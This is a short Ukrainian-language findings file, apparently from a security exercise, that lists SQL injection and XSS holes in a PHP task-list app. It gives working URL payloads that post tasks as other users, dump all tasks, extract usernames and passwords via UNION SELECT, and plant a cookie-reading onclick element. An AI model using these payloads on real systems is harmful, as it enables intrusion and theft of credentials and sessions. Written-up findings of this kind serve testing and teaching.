@@ -1,0 +1,24 @@
+1. SQL-Injection
+Можна писати таски без реєстрації, від імені будь-якого користувача. Наприклад ввівши в адресну строку:
+.../index.php?action=addTask&task=someTask',+username='someUser';+--+
+
+2. SQL-Injection
+Можна витягнути таски всіх користувачів:
+/index.php?username='+OR+1=1;+--+
+
+3. SQL-Injection
+Можна витягнути дані користувачів:
+/index.php?username='+UNION+SELECT+username+as+id,+null,+password+as+task,+null+FROM+users;+--+
+
+4. XSS
+Можна писати текст в інпуті використовуючи HTML i CSS:
+<h1>head</h1>
+
+4. XSS
+Можна змінити верстку. Ввівши в поле для таску таке:
+(Правда на практиці шось не вийшло. Я так зрозумів, шо Хром блокує шось серйозніше ніж алерти)
+<script>document.getElementsByTagName('body')[0].innerHtml = 'hacked'</script>
+
+5. XSS + SQL-Injection
+Можна добавити таск якомусь юзеру, нажавши на який - можна отримати наприклад його куки.
+/index.php?action=addTask&task=<span+onclick="alert(document.cookie)">Нове+завдання</span>',+username='someUser';+--+
